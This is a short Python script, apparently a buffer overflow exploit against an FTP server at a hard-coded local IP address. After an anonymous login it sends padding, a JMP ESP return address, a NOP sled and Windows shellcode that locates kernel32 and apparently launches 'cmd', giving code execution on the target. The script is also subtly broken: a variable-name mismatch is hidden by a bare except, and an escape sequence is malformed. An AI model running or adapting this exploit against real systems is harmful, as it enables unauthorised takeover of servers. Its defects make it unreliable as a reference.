import socket
import time
import sys
badChars = (
"\x31\xC9"                   
"\x64\x8B\x71\x30"           
"\x8B\x76\x0C"               
"\x8B\x76\x1C"               
"\x8B\x36"                   
"\x8B\x06"                   
"\x8B\x68\x08"               
"\xEB\x20"                   
"\x5B"                       
"\x53"                       
"\x55"                       
"\x5B"                       
"\x81\xEB\x11\x11\x11\x11"   
"\x81\xC3\xDA\x3F\x1A\x11"   
"\xFF\xD3"                   
"\x81\xC3\x11\x11\x11\x11"   
"\x81\xEB\x8C\xCC\x18\x11"   
"\xFF\xD3"                   
"\xE8\xDB\xFF\xFF\xFF"       
"\x63\x6d\x64"
)



jmp_esp = '\x53\x0a\84\x77'
nop_slides = '\x90' * 32
Payload = 'A'*251 + jmp_esp + nop_slides + badChars

try:
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               s.connect(('192.168.1.43', 21))
               s.recv(1024)
               s.send('USER anonymous\r\n')
               s.recv(1024)
               s.send('PASS anonymous\r\n')
               s.recv(1024)
               s.send(payload + '\r\n')
               s.recv(1024)
               s.send('QUIT\r\n')
               s.close()
               print("[*] Payload sent!") 
               time.sleep(1)
except:
        
                  sys.exit()
